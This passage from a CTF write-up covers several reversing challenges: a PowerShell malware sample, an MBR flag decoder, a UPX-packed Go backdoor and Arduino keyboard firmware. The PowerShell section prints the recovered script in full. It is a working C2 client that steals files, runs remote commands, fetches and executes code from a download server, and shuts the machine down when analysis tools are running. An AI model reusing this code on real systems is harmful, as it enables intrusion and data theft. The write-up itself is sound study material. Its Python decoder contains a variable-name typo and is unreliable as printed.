<span data-linenumber="189"></span>
<span data-linenumber="190"></span>
<span data-linenumber="191"></span>
<span data-linenumber="192"></span>
<span data-linenumber="193"></span>
<span data-linenumber="194"></span>
<span data-linenumber="195"></span>
<span data-linenumber="196"></span>
<span data-linenumber="197"></span>
<span data-linenumber="198"></span>
<span data-linenumber="199"></span>
<span data-linenumber="200"></span>
<span data-linenumber="201"></span>
<span data-linenumber="202"></span>
<span data-linenumber="203"></span>
<span data-linenumber="204"></span>
<span data-linenumber="205"></span>
<span data-linenumber="206"></span>
<span data-linenumber="207"></span>
<span data-linenumber="208"></span>
<span data-linenumber="209"></span>
<span data-linenumber="210"></span>
<span data-linenumber="211"></span>
<span data-linenumber="212"></span>
<span data-linenumber="213"></span>
<span data-linenumber="214"></span>
<span data-linenumber="215"></span>
<span data-linenumber="216"></span>
<span data-linenumber="217"></span>
<span data-linenumber="218"></span>
<span data-linenumber="219"></span>
<span data-linenumber="220"></span>
<span data-linenumber="221"></span>
<span data-linenumber="222"></span>
<span data-linenumber="223"></span>
<span data-linenumber="224"></span>
<span data-linenumber="225"></span>
<span data-linenumber="226"></span>
<span data-linenumber="227"></span>
<span data-linenumber="228"></span>
<span data-linenumber="229"></span>
<span data-linenumber="230"></span>
<span data-linenumber="231"></span>
<span data-linenumber="232"></span>
<span data-linenumber="233"></span>
<span data-linenumber="234"></span>
<span data-linenumber="235"></span>
<span data-linenumber="236"></span>
<span data-linenumber="237"></span>
<span data-linenumber="238"></span>
<span data-linenumber="239"></span>
<span data-linenumber="240"></span>
<span data-linenumber="241"></span>
<span data-linenumber="242"></span>
<span data-linenumber="243"></span>
<span data-linenumber="244"></span>
<span data-linenumber="245"></span>
<span data-linenumber="246"></span>
<span data-linenumber="247"></span>
<span data-linenumber="248"></span>
<span data-linenumber="249"></span>
<span data-linenumber="250"></span>
<span data-linenumber="251"></span>
<span data-linenumber="252"></span>
<span data-linenumber="253"></span>
<span data-linenumber="254"></span>
<span data-linenumber="255"></span>
<span data-linenumber="256"></span>
<span data-linenumber="257"></span>
<span data-linenumber="258"></span>
<span data-linenumber="259"></span>
<span data-linenumber="260"></span>
<span data-linenumber="261"></span>
<span data-linenumber="262"></span>
<span data-linenumber="263"></span>
<span data-linenumber="264"></span>
<span data-linenumber="265"></span>
<span data-linenumber="266"></span>
<span data-linenumber="267"></span>
<span data-linenumber="268"></span>
<span data-linenumber="269"></span>
<span data-linenumber="270"></span>
<span data-linenumber="271"></span>
<span data-linenumber="272"></span>
<span data-linenumber="273"></span>
<span data-linenumber="274"></span>
<span data-linenumber="275"></span>
<span data-linenumber="276"></span>
<span data-linenumber="277"></span>
<span data-linenumber="278"></span>
<span data-linenumber="279"></span>
<span data-linenumber="280"></span>
<span data-linenumber="281"></span>
<span data-linenumber="282"></span>
<span data-linenumber="283"></span>
<span data-linenumber="284"></span>
<span data-linenumber="285"></span>
<span data-linenumber="286"></span>
<span data-linenumber="287"></span>
<span data-linenumber="288"></span>
<span data-linenumber="289"></span>
<span data-linenumber="290"></span>
<span data-linenumber="291"></span>
<span data-linenumber="292"></span>
<span data-linenumber="293"></span>
<span data-linenumber="294"></span>
<span data-linenumber="295"></span>
<span data-linenumber="296"></span>
<span data-linenumber="297"></span>
<span data-linenumber="298"></span>
<span data-linenumber="299"></span>
<span data-linenumber="300"></span>
<span data-linenumber="301"></span>
<span data-linenumber="302"></span>
<span data-linenumber="303"></span>
<span data-linenumber="304"></span>
<span data-linenumber="305"></span>
<span data-linenumber="306"></span>
<span data-linenumber="307"></span>
<span data-linenumber="308"></span>
<span data-linenumber="309"></span>
<span data-linenumber="310"></span>
<span data-linenumber="311"></span>
<span data-linenumber="312"></span>
<span data-linenumber="313"></span>
<span data-linenumber="314"></span>
<span data-linenumber="315"></span>
<span data-linenumber="316"></span>
<span data-linenumber="317"></span>
<span data-linenumber="318"></span>
<span data-linenumber="319"></span>
<span data-linenumber="320"></span>
<span data-linenumber="321"></span>
<span data-linenumber="322"></span>
<span data-linenumber="323"></span>
<span data-linenumber="324"></span>
<span data-linenumber="325"></span>
<span data-linenumber="326"></span>
<span data-linenumber="327"></span>
<span data-linenumber="328"></span>
<span data-linenumber="329"></span>
<span data-linenumber="330"></span>
<span data-linenumber="331"></span>
<span data-linenumber="332"></span>
<span data-linenumber="333"></span>
<span data-linenumber="334"></span>
<span data-linenumber="335"></span>
<span data-linenumber="336"></span>
<span data-linenumber="337"></span>
<span data-linenumber="338"></span>
<span data-linenumber="339"></span>
<span data-linenumber="340"></span>
<span data-linenumber="341"></span>
<span data-linenumber="342"></span>
<span data-linenumber="343"></span>
<span data-linenumber="344"></span>
<span data-linenumber="345"></span>
<span data-linenumber="346"></span>
<span data-linenumber="347"></span>
<span data-linenumber="348"></span>
<span data-linenumber="349"></span>
<span data-linenumber="350"></span>
<span data-linenumber="351"></span>
<span data-linenumber="352"></span>
<span data-linenumber="353"></span>
<span data-linenumber="354"></span>
<span data-linenumber="355"></span>
<span data-linenumber="356"></span>
<span data-linenumber="357"></span>
<span data-linenumber="358"></span>
<span data-linenumber="359"></span>
<span data-linenumber="360"></span>
<span data-linenumber="361"></span>
<span data-linenumber="362"></span>
<span data-linenumber="363"></span>
<span data-linenumber="364"></span>
<span data-linenumber="365"></span></div><div class="code">$GET_FILE = <span class="hljs-string">'get-fle'</span> 
$DOWN_EXEC = <span class="hljs-string">'dow-exe'</span>
$RUN_CMD = <span class="hljs-string">'run-cmd'</span>

$GET_REG = <span class="hljs-string">'get-reg'</span>
$GET_TASK = <span class="hljs-string">'get-tak'</span>
$GET_UPDATE = <span class="hljs-string">'get-upd'</span>
$GET_REP = <span class="hljs-string">'get-rep'</span>

$STATUS_INIT  = <span class="hljs-number">0x0000</span>
$STATUS_REGED = <span class="hljs-number">0x8000</span>
$STATUS_TASK  = $STATUS_REGED -bor <span class="hljs-number">0x1</span>
$STATUS_PADD  = $STATUS_REGED -bor <span class="hljs-number">0x2</span>


$url = <span class="hljs-string">'http://192.168.99.234/cc/cc.php'</span>
$status = $STATUS_INIT
$task = $null
$running = $True

$pubk = (<span class="hljs-number">1501</span>,<span class="hljs-number">377753</span>)

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>-<span class="hljs-title">Md5Hash</span><span class="hljs-params">($str)</span>
</span>{
	$md5 = <span class="hljs-keyword">new</span>-object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
	$utf8 = <span class="hljs-keyword">new</span>-object -TypeName System.Text.UTF8Encoding
	$hash = [System.BitConverter]::ToString($md5.ComputeHash($utf8.GetBytes($str)))
	<span class="hljs-keyword">return</span> $hash -replace <span class="hljs-string">'-'</span>
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>-<span class="hljs-title">ComputeName</span>
</span>{
	<span class="hljs-keyword">try</span>
	{
		<span class="hljs-keyword">return</span> (Get-WmiObject Win32_ComputerSystem).Name;
	} <span class="hljs-keyword">catch</span> 
	{
		<span class="hljs-keyword">return</span> <span class="hljs-string">"ErrComputeName"</span>;
	}
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>-<span class="hljs-title">clientID</span>
</span>{
	<span class="hljs-keyword">try</span>
	{
		$did = (wmic diskdrive get SerialNumber)
		$cid = get-Md5Hash $did
		<span class="hljs-keyword">return</span> $cid
	}
	<span class="hljs-keyword">catch</span>
	{
		$CompName = get-ComputeName
		<span class="hljs-keyword">return</span> get-Md5Hash $CompName
	}
}
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Reg</span>-<span class="hljs-title">Info</span>
</span>{
	$clientID = get-clientID
	$time = Get-Date
	$c = $GET_REG
	<span class="hljs-keyword">return</span> @{c = $c ; x = $clientID ;e = $time ; i = <span class="hljs-number">0</span>} |  ConvertTo-Json
}
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>-<span class="hljs-title">Task</span>
</span>{
	$clientID = get-clientID
	$time = Get-Date
	$c = $GET_TASK
	<span class="hljs-keyword">return</span> @{c = $c ; x = $clientID ;e = $time  ; i = <span class="hljs-number">0</span>} |  ConvertTo-Json
}
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">EttRRRRRRhd</span> <span class="hljs-params">( $tid , $taskinfo )</span>
</span>{
	$clientID = get-clientID
	$time = Get-Date
	$c = $GET_REP
	<span class="hljs-keyword">return</span> @{c = $c ; x = $clientID ;e = $taskinfo; i = $tid} |  ConvertTo-Json
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_VM</span><span class="hljs-params">()</span>
</span>{
	$p = @(<span class="hljs-string">"win32_remote"</span>,<span class="hljs-string">"win64_remote64"</span>,<span class="hljs-string">"ollydbg"</span>,<span class="hljs-string">"ProcessHacker"</span>,<span class="hljs-string">"tcpview"</span>,<span class="hljs-string">"autoruns"</span>,<span class="hljs-string">"autorunsc"</span>,<span class="hljs-string">"filemon"</span>,<span class="hljs-string">"procmon"</span>,<span class="hljs-string">"regmon"</span>,<span class="hljs-string">"procexp"</span>,<span class="hljs-string">"idaq"</span>,<span class="hljs-string">"idaq64"</span>,<span class="hljs-string">"ImmunityDebugger"</span>,<span class="hljs-string">"Wireshark"</span>,<span class="hljs-string">"dumpcap"</span>,<span class="hljs-string">"HookExplorer"</span>,<span class="hljs-string">"ImportREC"</span>,<span class="hljs-string">"PETools"</span>,<span class="hljs-string">"LordPE"</span>,<span class="hljs-string">"dumpcap"</span>,<span class="hljs-string">"SysInspector"</span>,<span class="hljs-string">"proc_analyzer"</span>,<span class="hljs-string">"sysAnalyzer"</span>,<span class="hljs-string">"sniff_hit"</span>,<span class="hljs-string">"windbg"</span>,<span class="hljs-string">"joeboxcontrol"</span>,<span class="hljs-string">"joeboxserver"</span>)
	<span class="hljs-keyword">for</span> ($i=<span class="hljs-number">0</span>; $i -lt $p.length; $i++) {
		<span class="hljs-keyword">if</span>(ps -name $p[$i] -ErrorAction SilentlyContinue){
			shutdown /s /f /t <span class="hljs-number">0</span>
			<span class="hljs-keyword">exit</span>
		}
	}
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">YTRKLJHBKJHJHGV</span><span class="hljs-params">($msg)</span>
</span>{
	<span class="hljs-keyword">while</span>($True)
	{
		<span class="hljs-keyword">try</span>
		{
			$content = $msg
			$webRq = [System.Net.WebRequest]::Create($url)
			$webRq.proxy = [Net.WebRequest]::GetSystemWebProxy()
			$webRq.proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
			
            
            <span class="hljs-comment">#</span>
            
            $content = YNHGFOI8YIUGH $content
            
            
            <span class="hljs-comment">#</span>
            $content = OPKE3989hYYY $pubk $content
            <span class="hljs-comment">#</span>
            
            <span class="hljs-comment">#</span>
            $content = YNHGFOI8YIUGH $content
            
			$enc = [System.Text.Encoding]::UTF8.GetBytes($content)
            
            <span class="hljs-comment">#</span>

			$webRq.Method = <span class="hljs-string">'POST'</span>
			$webRq.ContentLength = $enc.length
			
			
			<span class="hljs-keyword">if</span> ($enc.length -gt <span class="hljs-number">0</span>)
			{
				$req_stream = $webRq.GetRequestStream()
				$req_stream.Write($enc , <span class="hljs-number">0</span> , $enc.length)
				
			}
			
			[System.Net.WebResponse] $rep = $webRq.GetResponse()
			<span class="hljs-keyword">if</span> ($rep -ne $null)
			{
				$data = $rep.GetResponseStream()
				[System.IO.StreamReader] $res_d = <span class="hljs-keyword">New</span>-Object System.IO.StreamReader $data
				[String] $result = $res_d.ReadToEnd()
 			}
		}
		<span class="hljs-keyword">catch</span>
		{
			$result = <span class="hljs-string">'err'</span>
            <span class="hljs-comment">#</span>
		}
		
		<span class="hljs-keyword">if</span> ($result -eq <span class="hljs-string">'err'</span>)
		{
			
		}
		<span class="hljs-keyword">else</span>
		{
            
			<span class="hljs-keyword">return</span> $result
		}
	}
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">POIUIGKJNBYFF</span><span class="hljs-params">($msg)</span>
</span>{

    $msg = OKMNHGGGGSSAAA $pubk $msg
	$msg = ConvertFrom-Json -InputObject $msg
	<span class="hljs-keyword">return</span> $msg.r,$msg.e
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">YNHGFOI8YIUGH</span><span class="hljs-params">( $str )</span>
</span>{
	<span class="hljs-keyword">return</span> [Convert]::ToBase64String( [System.Text.Encoding]::Utf8.GetBytes($str))
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">VCDHJIIDDSQQQ</span><span class="hljs-params">( $b64 )</span>
</span>{
	<span class="hljs-keyword">return</span> [System.Text.Encoding]::Utf8.GetString([System.Convert]::FromBase64String($b64))
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">POPOUIUJKKKI</span><span class="hljs-params">($file)</span>
</span>{
	<span class="hljs-keyword">return</span> YNHGFOI8YIUGH (Get-Content $file)
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">MJOOLLFGFASA</span><span class="hljs-params">($name)</span>
</span>{
	$filelist = @()
	$result = @{}
	
	<span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0x43</span> ; $i -lt <span class="hljs-number">0x5b</span>; ++ $i)
	{
		<span class="hljs-keyword">try</span>
		{   $dc = <span class="hljs-string">'{0}:/'</span> -f ([char]$i)
			$file = Get-ChildItem <span class="hljs-string">"$dc"</span> -recurse $name | %{$_.FullName}
			<span class="hljs-keyword">if</span> ($file.length -gt <span class="hljs-number">0</span>)
			{
				$filelist += $file
			}
		}
		<span class="hljs-keyword">catch</span>
		{
			<span class="hljs-keyword">continue</span>
		}
	}
	
	$result.ct = $filelist.length
	$result.dt = @()
	<span class="hljs-keyword">foreach</span>( $f in $filelist)
	{
		$fd = POPOUIUJKKKI $f
		$result.dt += @{path=(YNHGFOI8YIUGH $f ); txt=$fd}
	}
	<span class="hljs-keyword">return</span> ConvertTo-Json -InputObject $result 
}


<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">DXCFGIOUUGKJB764</span><span class="hljs-params">($x, $h, $n)</span>
</span>{
   $y = <span class="hljs-number">1</span>
   <span class="hljs-keyword">while</span>( $h -gt <span class="hljs-number">0</span> )
   {
        <span class="hljs-keyword">if</span> ( ( $h % <span class="hljs-number">2</span> ) -eq <span class="hljs-number">0</span>)
        {
            $x = ($x * $x) % $n
            $h = $h / <span class="hljs-number">2</span>
        }<span class="hljs-keyword">else</span>
        {
            $y = ($x * $y) % $n
            $h = $h - <span class="hljs-number">1</span>
        }
   }
   <span class="hljs-keyword">return</span> $y
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">OPKE3989hYYY</span><span class="hljs-params">($pk , $plaintext)</span>
</span>{
    $key , $n = $pk
    $arr = @()
    <span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span> ; $i -lt $plaintext.length ; $i++)
    {
     $x = DXCFGIOUUGKJB764 ([int] $plaintext[$i]) $key $n
     $arr += $x
    }
    <span class="hljs-keyword">return</span> $arr
}
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">OKMNHGGGGSSAAA</span><span class="hljs-params">($pk,$enctext)</span>
</span>{
    $key , $n = $pk
    $txt = <span class="hljs-string">""</span>

    $enctext = VCDHJIIDDSQQQ $enctext
    [int[]]$enctab =  $enctext -split <span class="hljs-string">' '</span>
    <span class="hljs-keyword">foreach</span> ($x in $enctab)
    {
        <span class="hljs-keyword">if</span> ($x -eq <span class="hljs-number">0</span>)
        {
            <span class="hljs-keyword">continue</span>
        }
        $x = DXCFGIOUUGKJB764 $x $key $n
        $txt += [char][int]$x
    }
    $txt = VCDHJIIDDSQQQ($txt)
    <span class="hljs-keyword">return</span> $txt
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">UIHIUHGUYGOIJOIHGIHGIH</span><span class="hljs-params">($cmd)</span>
</span>{
	$cmd = ConvertFrom-Json -InputObject $cmd
	$c = $cmd.c
	$i = $cmd.i
	$e = $cmd.e
	$x = $cmd.x 
	
	<span class="hljs-comment">#</span>
	<span class="hljs-comment">#</span>
	
	<span class="hljs-keyword">if</span> ($c -eq $GET_FILE)
	{
		
		$d = MJOOLLFGFASA $e
	}
	<span class="hljs-keyword">elseif</span> ($c -eq $RUN_CMD)
	{
		
		$d = Invoke-Expression $e -ErrorAction SilentlyContinue
	}
	<span class="hljs-keyword">elseif</span> ($c -eq $DOWN_EXEC)
	{
		
		$d = Invoke-Expression ((<span class="hljs-keyword">New</span>-Object Net.WebClient).DownloadString(<span class="hljs-string">"$e"</span>)) -ErrorAction SilentlyContinue
	}
<span class="hljs-keyword">return</span> @($i , $d)
}


$MuName = <span class="hljs-string">'Global\_94_HACK_U_HAHAHAHAHA'</span>
$retFlag = $flase
$Result = $True 
$MyMutexObj = <span class="hljs-keyword">New</span>-Object System.Threading.Mutex ($true,$MuName,[ref]$retFlag)
<span class="hljs-keyword">if</span> ($retFlag)
{
	$Result = $True
}
<span class="hljs-keyword">else</span>
{
	$Result = $False
}

<span class="hljs-keyword">if</span> ($Result)
{
	<span class="hljs-keyword">while</span>($True -<span class="hljs-keyword">and</span> $running)
	{
		
		<span class="hljs-keyword">if</span>($status -eq $STATUS_INIT)
		{
			
			$OO0O0O0O00 = Reg-Info
			
			
			$ret = YTRKLJHBKJHJHGV($OO0O0O0O00)
            
			$r,$e = POIUIGKJNBYFF($ret)
            
            
			<span class="hljs-keyword">if</span> ($r -eq <span class="hljs-string">'yes'</span> -<span class="hljs-keyword">and</span> $e -eq <span class="hljs-string">'ok_then_u_go'</span>)
			{
				$status = $STATUS_PADD
				
				
			}
		}
		<span class="hljs-keyword">if</span> ($status -eq $STATUS_PADD)
		{
			
			
			$OO0O0O0O00 = get-Task
			
			$ret = YTRKLJHBKJHJHGV($OO0O0O0O00)
			$r,$e = POIUIGKJNBYFF($ret)
			<span class="hljs-keyword">if</span> ($r -eq <span class="hljs-string">'yes'</span>)
			{
				
				$task = $e
				$status = $STATUS_TASK
			}
			
		}
		<span class="hljs-keyword">if</span> ($status -eq $STATUS_TASK)
		{
			
			
			<span class="hljs-comment">#</span>
			$ret = UIHIUHGUYGOIJOIHGIHGIH($task)
			$OO0O0O0O00 = EttRRRRRRhd $ret[<span class="hljs-number">0</span>] $ret[<span class="hljs-number">1</span>]
			$ret = YTRKLJHBKJHJHGV($OO0O0O0O00)
			
			$r,$e = POIUIGKJNBYFF($ret)
			<span class="hljs-keyword">if</span> ($r -eq <span class="hljs-string">'yes'</span>)
			{
				$status = $STATUS_PADD
				$task = $null
			}
		}
		
		sleep <span class="hljs-number">3</span>
	}
	$MyMutexObj.ReleaseMutex() | Out-<span class="hljs-keyword">Null</span>
	$MyMutexObj.Dispose() | Out-<span class="hljs-keyword">Null</span>
}
<span class="hljs-keyword">else</span>
{

}
</div></div></code></pre><p>They use <code>rsa</code> to encrypt message. the n is easy to factor.</p><p>Still, we can find out the encrypted message from pcap file.</p><p>We also extract two things from those message. The first one is a rar file, the second is a ps1 script.</p><p>We cannot open the rar file. After a few hour, the host change the challenge. Now we have flag part1 instead of rar file. The flag part1 is <code>HITBXCTF{W0rk_1n_th3_dark_</code></p><p>Let’s see the ps1 script. It actually generate a exe file at the temp directory.</p><p>Then, we can reverse that exe file.</p><p>I found out that it’s trying to write something on MBR.</p><p>The final step is reversing what it write on MBR. It’s 80286 architecture.</p><p>Now we just need decode the encryted flag part2.</p><pre><code class="python hljs"><div class="wrapper"><div class="gutter linenumber"><span data-linenumber="1"></span>
<span data-linenumber="2"></span>
<span data-linenumber="3"></span>
<span data-linenumber="4"></span>
<span data-linenumber="5"></span>
<span data-linenumber="6"></span>
<span data-linenumber="7"></span>
<span data-linenumber="8"></span>
<span data-linenumber="9"></span>
<span data-linenumber="10"></span>
<span data-linenumber="11"></span>
<span data-linenumber="12"></span>
<span data-linenumber="13"></span>
<span data-linenumber="14"></span>
<span data-linenumber="15"></span>
<span data-linenumber="16"></span>
<span data-linenumber="17"></span>
<span data-linenumber="18"></span>
<span data-linenumber="19"></span>
<span data-linenumber="20"></span>
<span data-linenumber="21"></span>
<span data-linenumber="22"></span></div><div class="code">ciphertext=<span class="hljs-string">'%\xa19\x89\xa6\x9d\xd5\xa5u\x8dJ\x92\xf1Y^\x91'</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ror</span><span class="hljs-params">(a,b)</span>:</span>
  <span class="hljs-keyword">return</span> (a&gt;&gt;b)|(a&lt;&lt;(<span class="hljs-number">8</span>-b))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rol</span><span class="hljs-params">(a,b)</span>:</span>
  <span class="hljs-keyword">return</span> (a&lt;&lt;b)|(a&gt;&gt;(<span class="hljs-number">8</span>-b))
flag=<span class="hljs-string">""</span>
table=[]
<span class="hljs-comment">#maintain a table</span>
<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">256</span>):
  x=j
  x=ror(x,<span class="hljs-number">3</span>)%<span class="hljs-number">256</span>
  x^=<span class="hljs-number">0x74</span>
  x=rol(x,<span class="hljs-number">5</span>)%<span class="hljs-number">256</span>
  x+=<span class="hljs-number">0x47</span>
  x%=<span class="hljs-number">256</span>
  <span class="hljs-keyword">if</span>(x%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>):
    teble.append(x<span class="hljs-number">-1</span>)
  <span class="hljs-keyword">else</span>:
    table.append(x+<span class="hljs-number">1</span>)
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ciphertext:
  flag+=chr(table.index(ord(i)))
<span class="hljs-keyword">print</span> flag
</div></div></code></pre><h3 id="sdsun-sces60107-sasdf" style=""><a class="anchor hidden-xs" href="#sdsun-sces60107-sasdf" title="sdsun-sces60107-sasdf"><span class="octicon octicon-link"></span></a>sdsun (sces60107 sasdf)</h3><p>The first thing you will notice is that the binary is packed by upx.</p><p>The way I unpack the binary is using gdb. I let the binary exectue for a while. It will be unpacked in the memory. So I can dump the whole memory in gdb.</p><p>Now I have the unpacked binary. but it is hard to understand it.</p><p>I found some feature indicating that this binary is written in Go language.</p><p>Then I use this <a href="https://gitlab.com/zaytsevgu/goutils/blob/master/go_renamer.py" target="_blank">script</a> to recover the symbol. It will be much easier to understand this binary.<br>
<img src="https://i.imgur.com/ysBuyUy.png" alt=""></p><p>It seems like there is a backdoor. This binary will listen to a random port. And it will output the port number.</p><p>The communication with the backdoor is compressed. and it use zlib. Also, the communication format is json.</p><p>The backdoor will give you flag if your command is <code>{"action":"GetFlag"}</code>. We found this rule in <code>main.Process</code><br>
<img src="https://i.imgur.com/w487Voi.png" alt=""></p><p>Now we have the flag <code>HITB{4e773ff1406800017933c9a1c9f14f35}</code></p><h3 id="hex-sasdf" style=""><a class="anchor hidden-xs" href="#hex-sasdf" title="hex-sasdf"><span class="octicon octicon-link"></span></a>hex (sasdf)</h3><p>A arduino challenge, data is in intelhex format. I use helper script <code>hex2bin.py</code> from intexHex python library to generate binary.</p><h4 id="First-try"><a class="anchor hidden-xs" href="#First-try" title="First-try"><span class="octicon octicon-link"></span></a>First try</h4><p>Loaded in disassembler with MCU as AVR, you can easily find pattern below keep repeating started from 0x987 (in IDA, or 0x130e in radare2)</p><pre><code class="asm hljs">ldi r22, 0xXX
ldi r24, 0x77
ldi r25, 0x01
<span class="hljs-keyword">call</span> <span class="hljs-number">0xffa</span>
ldi r22, <span class="hljs-number">0xf4</span>
ldi r23, <span class="hljs-number">0x01</span>
ldi r24, <span class="hljs-number">0x00</span>
ldi r25, <span class="hljs-number">0x00</span>
<span class="hljs-keyword">call</span> <span class="hljs-number">0xbda</span>
ldi r22, <span class="hljs-number">0</span>xXX
ldi r24, <span class="hljs-number">0x77</span>
ldi r25, <span class="hljs-number">0x01</span>
<span class="hljs-keyword">call</span> <span class="hljs-number">0xf62</span>
ldi r22, <span class="hljs-number">0x88</span>
ldi r23, <span class="hljs-number">0x13</span>
ldi r24, <span class="hljs-number">0x00</span>
ldi r25, <span class="hljs-number">0x00</span>
<span class="hljs-keyword">call</span> <span class="hljs-number">0xbda</span>
</code></pre><p>I dumped all <code>XX</code> bytes in previous pattern but didn’t figure out how to decode it. So I decided to dig into these functions. It tooks me about half hour to manually decompile <code>fcn.ffa</code> to following (wrong) psuedo code:</p><pre><code class="python hljs">r26 = <span class="hljs-number">0x77</span>
<span class="hljs-keyword">if</span> r22 &gt;= <span class="hljs-number">136</span>:
    r31 = <span class="hljs-number">0</span>
    r30 = r22 &amp; <span class="hljs-number">0x7f</span>
    mem[<span class="hljs-number">0x77</span>+<span class="hljs-number">4</span>] |= (<span class="hljs-number">1</span> &lt;&lt; r30)
    r22 = <span class="hljs-number">0</span>
<span class="hljs-keyword">else</span>:
    r22 + <span class="hljs-number">0x78</span>

<span class="hljs-keyword">if</span> r22 <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> mem[<span class="hljs-number">0x77</span>+<span class="hljs-number">6</span>:<span class="hljs-number">0x77</span>+<span class="hljs-number">0xc</span>]: <span class="hljs-comment"># six slots</span>
    <span class="hljs-keyword">try</span>:
        slot = mem[<span class="hljs-number">0x77</span>+<span class="hljs-number">6</span>:<span class="hljs-number">0x77</span>+<span class="hljs-number">0xc</span>].index(<span class="hljs-number">0</span>)
    <span class="hljs-keyword">except</span>:
        mem[<span class="hljs-number">0x77</span>+<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>
        mem[<span class="hljs-number">0x77</span>+<span class="hljs-number">2</span>] = <span class="hljs-number">1</span>
        <span class="hljs-keyword">return</span>
    mem[<span class="hljs-number">0x77</span>+<span class="hljs-number">6</span>+slot] = r22

fcn_e7e()
</code></pre><p>I gave up.</p><h4 id="Second-try"><a class="anchor hidden-xs" href="#Second-try" title="Second-try"><span class="octicon octicon-link"></span></a>Second try</h4><p>After the third hint <code>Keyboard</code> is out, I suddenly realized that MCU of Arduino Micro is ATmega32u4, a USB enabled device, rather than common arduino MCU ATmega328p. Everything makes sense now. The structure in 0x77 must be USB keyboard report which has 6 slot (a obvious sign if you are familar with NKRO or know the difference between PS2 and USB keyboard). Here’s source code from Arduino’s Keyboard library:</p><pre><code class="C++ hljs"><span class="hljs-keyword">size_t</span> Keyboard_::press(<span class="hljs-keyword">uint8_t</span> k) 
{
	<span class="hljs-keyword">uint8_t</span> i;
	<span class="hljs-keyword">if</span> (k &gt;= <span class="hljs-number">136</span>) {			<span class="hljs-comment">// it's a non-printing key (not a modifier)</span>
		k = k - <span class="hljs-number">136</span>;
	} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (k &gt;= <span class="hljs-number">128</span>) {	<span class="hljs-comment">// it's a modifier key</span>
		_keyReport.modifiers |= (<span class="hljs-number">1</span>&lt;&lt;(k<span class="hljs-number">-128</span>));
		k = <span class="hljs-number">0</span>;
	} <span class="hljs-keyword">else</span> {				<span class="hljs-comment">// it's a printing key</span>
		k = pgm_read_byte(_asciimap + k);
		<span class="hljs-keyword">if</span> (!k) {
			setWriteError();
			<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
		}
		<span class="hljs-keyword">if</span> (k &amp; <span class="hljs-number">0x80</span>) {						<span class="hljs-comment">// it's a capital letter or other character reached with shift</span>
			_keyReport.modifiers |= <span class="hljs-number">0x02</span>;	<span class="hljs-comment">// the left shift modifier</span>
			k &amp;= <span class="hljs-number">0x7F</span>;
		}
	}
	
	<span class="hljs-comment">// Add k to the key report only if it's not already present</span>
	<span class="hljs-comment">// and if there is an empty slot.</span>
	<span class="hljs-keyword">if</span> (_keyReport.keys[<span class="hljs-number">0</span>] != k &amp;&amp; _keyReport.keys[<span class="hljs-number">1</span>] != k &amp;&amp; 
		_keyReport.keys[<span class="hljs-number">2</span>] != k &amp;&amp; _keyReport.keys[<span class="hljs-number">3</span>] != k &amp;&amp;
		_keyReport.keys[<span class="hljs-number">4</span>] != k &amp;&amp; _keyReport.keys[<span class="hljs-number">5</span>] != k) {
		
		<span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">6</span>; i++) {
			<span class="hljs-keyword">if</span> (_keyReport.keys[i] == <span class="hljs-number">0x00</span>) {
				_keyReport.keys[i] = k;
				<span class="hljs-keyword">break</span>;
			}
		}
		<span class="hljs-keyword">if</span> (i == <span class="hljs-number">6</span>) {
			setWriteError();
			<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
		}	
	}
	sendReport(&amp;_keyReport);
	<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
}
</code></pre><p>Ahh, <code>fcn.ffa</code> is <code>Keyboard::_press</code>!! It turns out that <code>fcn.f62</code> is <code>Keyboard::_release</code> and <code>fcn.bda</code>, which use timer register <code>TCNT0</code>, is <code>delay</code>.</p><p>Take our previous dump of parameters, convert it to keystroke, and the flag shows up.</p><pre><code>      $##&amp;:|#|                          !##| ;&amp;&amp;&amp;&amp;&amp;&amp;$#   #$##@|.    `%##@;  :@#$`
     |#|   |#|                         ;#%.  !#!       .%#|  #&amp;#!  |#|  #&amp;@:  :#%.
   ;#####|.|#|  .|####$`   #&amp;###|!@%.  ;#|   |#;              |#! :@$`   ;#%.`:@%.
     |#!   |#|   `.  :@$` ;#&amp;#  .%#%.  !#|  .%##@&amp;##@#      :&amp;#!  ;#%.   :@$`  #&amp;$`
     |#!   |#|  `%#####&amp;#.%#!#####;#%`!#@;          ;#$`   ;##!    ;#$`   ;#%.` $#$`
     |#!   |#| .%#@%&amp;@#&amp;#  |####&amp;&amp;#%.  ;#|   !##@@##%` :@#######$. `$##@##!   @%.
